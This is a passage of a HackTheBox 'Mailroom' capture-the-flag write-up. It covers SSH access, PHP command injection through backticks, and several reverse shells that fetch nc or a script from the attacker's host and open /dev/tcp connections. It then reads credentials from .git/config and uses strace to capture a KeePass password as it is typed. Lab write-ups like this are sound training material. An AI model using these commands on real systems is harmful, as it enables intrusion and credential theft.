+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">email=tristan@mailroom.htb&amp;password=69trisRulez!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With this, we can access the machine through ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh tristan@mailroom.htb            
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;mailroom.htb (10.10.11.209)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:c4alO/6TY4cZRWE6/Mr+rsUQ3AXFKUZDWmSifHVp9pQ.
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>mailroom.htb<span class="s1">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">tristan@mailroom.htb&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">You have mail.
+</span></span><span class="line"><span class="cl">tristan@mailroom:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="access-as-user-tristan">Access as user tristan</h2>
+<h3 id="enumerating-the-private-webpage-directly-through-port-forwarding">Enumerating the private webpage directly through port forwarding</h3>
+<p>The ssh banner also tells us we have mail, which is will be the 2FA notifications we have been sending during our mongoDB regex adventures.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tristan@mailroom:/var/mail$ cat tristan 
+</span></span><span class="line"><span class="cl">Return-Path: &lt;noreply@mailroom.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: tristan@mailroom.htb
+</span></span><span class="line"><span class="cl">Delivered-To: tristan@mailroom.htb
+</span></span><span class="line"><span class="cl">Received: from localhost <span class="o">(</span>unknown <span class="o">[</span>172.19.0.5<span class="o">])</span>
+</span></span><span class="line"><span class="cl">        by mailroom.localdomain <span class="o">(</span>Postfix<span class="o">)</span> with SMTP id 14BBF1AEC
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> &lt;tristan@mailroom.htb&gt;<span class="p">;</span> Sun,  <span class="m">16</span> Apr <span class="m">2023</span> 18:02:03 +0000 <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Subject: 2FA
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token<span class="o">=</span>2a5bb5f3da937782b46ce69491f7c485
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With our ssh capabilities, we can do SSH tunneling now to visit the internal staff-review-panel without the XSS hassle.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh -D <span class="m">1080</span> tristan@mailroom.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting the webpage, we see the same login that we have been using, this time in a browser setting:</p>
+<p><img src="/post/hackthebox-mailroom/Images/Login.PNG"
+	width="1223"
+	height="742"
+	srcset="/post/hackthebox-mailroom/Images/Login_huf6e763f6db130018bf6df5c5f118efb0_82115_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/Login_huf6e763f6db130018bf6df5c5f118efb0_82115_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="Logging in with Tristan&rsquo;s credentials"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
+	
+></p>
+<p>let&rsquo;s try pasting in the link that they send us from the email:</p>
+<p><img src="/post/hackthebox-mailroom/Images/Verified.PNG"
+	width="721"
+	height="526"
+	srcset="/post/hackthebox-mailroom/Images/Verified_hu8d549e4a01909ee5c07165c387cddc3a_98348_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/Verified_hu8d549e4a01909ee5c07165c387cddc3a_98348_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="2FA redirects us to the dashboard, with the proper cookies."
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="328px"
+	
+></p>
+<p>Finally we are in. We can see some recent activities, using an identifier that looks to be some kind of hash.</p>
+<p>Checking the inspect page, we can view queries through once again broad regex terms</p>
+<p><img src="/post/hackthebox-mailroom/Images/Inspect1.PNG"
+	width="1283"
+	height="274"
+	srcset="/post/hackthebox-mailroom/Images/Inspect1_hu1f0791d867bc624f642734573b657ff8_64103_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/Inspect1_hu1f0791d867bc624f642734573b657ff8_64103_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="468"
+		data-flex-basis="1123px"
+	
+></p>
+<p>There are no other interesting messages. Looking at the source code for this page (again, this is the same code repository located on the <code>git.mailroom.htb</code> site), we can see how this command is being done, through a shell exec command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inquiry_id&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$inquiryId</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\$&lt;&gt;;|&amp;{}\(\)\[\]\&#39;\&#34;]/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inquiry_id&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$contents</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;cat /var/www/mailroom/inquiries/</span><span class="si">$inquiryId</span><span class="s2">.html&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="remote-code-execution-through-command-injection">Remote Code Execution through Command Injection</h3>
+<p>While there is some filtering done with the <code>preg_replace</code> function, it is not thorough enough. We can execute commands nested in this through use of the backtick, `.</p>
+<p><img src="/CommandExecution.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>When we execute this, we find a connection on our local kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -vlp <span class="m">80</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.35<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.209<span class="o">]</span> <span class="m">47198</span>
+</span></span><span class="line"><span class="cl">GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.35
+</span></span><span class="line"><span class="cl">User-Agent: curl/7.74.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With this, we can connect a new shell as the web account user.</p>
+<p>Traditional reverse shell 1-liners were very troublesome to introduce, so instead I decided to try and download <code>nc</code> from my kali, then run this binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`wget 10.10.14.35/nc -o /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.35 8888 -e /bin/bash`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Once again, <code>wget</code> is not well working, but I know <code>curl</code> works from my original probing. Perhaps I can curl a bash rev shell script, then pipe it directly to sh?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat r.sh 
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.35/8888 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`curl 10.10.14.35/r.sh | sh`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This doesn&rsquo;t work either, but finally I learn a compromise: splitting the commands into 3 requests</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`curl 10.10.14.35/nc -o /tmp/nc`
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">`chmod +x /tmp/nc`
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">`/tmp/nc 10.10.14.35 8888 -e /bin/bash`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On kali listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 51538
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement</h2>
+<h3 id="enumerating-docker-container-as-www-data">Enumerating docker container as www-data</h3>
+<p>Enumerating this session shows us we are not in the same box, but instead a compartmentalized container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All users are gone, and in the base directory, we can see a <code>.dockerenv</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -al /
+</span></span><span class="line"><span class="cl">total 76
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Apr 16 05:49 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Apr 16 05:49 ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x   1 root root    0 Apr 16 05:49 .dockerenv
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Jan 17  2023 bin
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Sep  3  2022 boot
+</span></span><span class="line"><span class="cl">drwxr-xr-x   5 root root  340 Apr 16 05:49 dev
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Apr 16 05:49 etc
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Sep  3  2022 home
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Jan 17  2023 lib
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Nov 14  2022 lib64
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Nov 14  2022 media
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Nov 14  2022 mnt
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Nov 14  2022 opt
+</span></span><span class="line"><span class="cl">dr-xr-xr-x 321 root root    0 Apr 16 05:49 proc
+</span></span><span class="line"><span class="cl">drwx------   1 root root 4096 Apr 20 14:08 root
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Nov 15  2022 run
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Jan 17  2023 sbin
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
+</span></span><span class="line"><span class="cl">dr-xr-xr-x  13 root root    0 Apr 16 05:49 sys
+</span></span><span class="line"><span class="cl">drwxrwxrwt   1 root root 4096 Apr 16 18:43 tmp
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Nov 15  2022 var
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enumerating this container, we can see a the hidden <code>.git</code> file within the web files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">total 68
+</span></span><span class="line"><span class="cl">drwxr-xr-x 7 root root 4096 Jan 19  2023 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 5 root root 4096 Jan 15  2023 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x 8 root root 4096 Jan 19  2023 .git
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root    0 Jan 15  2023 README.md
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root 3453 Jan 19  2023 auth.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root   62 Jan 15  2023 composer.json
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root 8096 Jan 15  2023 composer.lock
+</span></span><span class="line"><span class="cl">drwxr-xr-x 2 root root 4096 Jan 15  2023 css
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root 5848 Jan 19  2023 dashboard.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x 3 root root 4096 Jan 15  2023 font
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root 2594 Jan 15  2023 index.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root 6326 Jan 18  2023 inspect.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x 2 root root 4096 Jan 15  2023 js
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root root  953 Jan 15  2023 register.html
+</span></span><span class="line"><span class="cl">drwxr-xr-x 6 root root 4096 Jan 15  2023 vendor
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Checking the <code>.git/config</code> file reveals credentials for mattew:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat config
+</span></span><span class="line"><span class="cl">[core]
+</span></span><span class="line"><span class="cl">        repositoryformatversion = 0
+</span></span><span class="line"><span class="cl">        filemode = true
+</span></span><span class="line"><span class="cl">        bare = false
+</span></span><span class="line"><span class="cl">        logallrefupdates = true
+</span></span><span class="line"><span class="cl">[remote &#34;origin&#34;]
+</span></span><span class="line"><span class="cl">        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
+</span></span><span class="line"><span class="cl">        fetch = +refs/heads/*:refs/remotes/origin/*
+</span></span><span class="line"><span class="cl">[branch &#34;main&#34;]
+</span></span><span class="line"><span class="cl">        remote = origin
+</span></span><span class="line"><span class="cl">        merge = refs/heads/main
+</span></span><span class="line"><span class="cl">[user]
+</span></span><span class="line"><span class="cl">        email = matthew@mailroom.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>While the password is shown as HueLover83%23, we know this is a url line. The %23 will convert to <code>#</code>, so the password must be <code>HueLover83#</code>. We can now log in as user matthew back on the primary machine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tristan@mailroom:~$ su matthew
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">matthew@mailroom:/home/tristan$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can finally get the <code>user.txt</code> from matthew&rsquo;s home dir.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="enumerating-system-as-matthew">Enumerating system as matthew</h3>
+<p>Also found in matthew&rsquo;s home dir, is a keepass file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">matthew@mailroom:~$ ls
+</span></span><span class="line"><span class="cl">personal.kdbx  personal.kdbx.lock  user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finding <code>personal.kdbx.lock</code> is a clear indicator that keepass vault is currently being accessed. Monitoring the folder for a little bit, we can see the lock file appear and disappear very frequently. It seems someone is accessing the keepass vault regularly. If we can perhaps spy on the session that is accessing this vault, we might be able to watch the password being input.</p>
+<h3 id="using-strace-to-monitor-processes-in-real-time">Using strace to monitor processes in real time</h3>
+<p><a class="link" href="https://jvns.ca/blog/2014/02/17/spying-on-ssh-with-strace/"  target="_blank" rel="noopener"
+    >This article covers strace and how it might be used to leak ssh passwords.</a> If we know the process ID that is accessing this kdbx, we can utilize this strategy.</p>
+<p>To watch processes in real time, I use <code>top</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">matthew@mailroom:~$ top
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/hackthebox-mailroom/Images/Top.PNG"
+	width="947"
+	height="250"
+	srcset="/post/hackthebox-mailroom/Images/Top_hu96b0acea388610508fb979a0a77db89a_106311_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/Top_hu96b0acea388610508fb979a0a77db89a_106311_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="378"
+		data-flex-basis="909px"
+	
+></p>
+<p>We can see kpcli (the keepass command line interface program) and its PID, as it appears and disappears in real time. In another shell session, I submit an strace process once I see kpcli appear:</p>
+<p>strace output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">matthew@mailroom:~$ strace -p 107030
+</span></span><span class="line"><span class="cl">strace: Process 107030 attached
+</span></span><span class="line"><span class="cl">pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
+</span></span><span class="line"><span class="cl">read(3, &#34;m&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+</span></span><span class="line"><span class="cl">write(4, &#34;m&#34;, 1)                        = 1
+</span></span><span class="line"><span class="cl">pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
+</span></span><span class="line"><span class="cl">read(3, &#34;a&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+</span></span><span class="line"><span class="cl">write(4, &#34;a&#34;, 1)                        = 1
+</span></span><span class="line"><span class="cl">pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
+</span></span><span class="line"><span class="cl">read(3, &#34;t&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+</span></span><span class="line"><span class="cl">write(4, &#34;t&#34;, 1)                        = 1
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output is messy, but we can see the information of letters being inputted and an echo, likely related to the character being reflected back in the command line. We can clean it up a bit by grepping for read or write:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat trace| grep read
+</span></span><span class="line"><span class="cl">read(3, &#34;m&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;a&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;t&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;t&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;h&#34;, 1)                         = 1
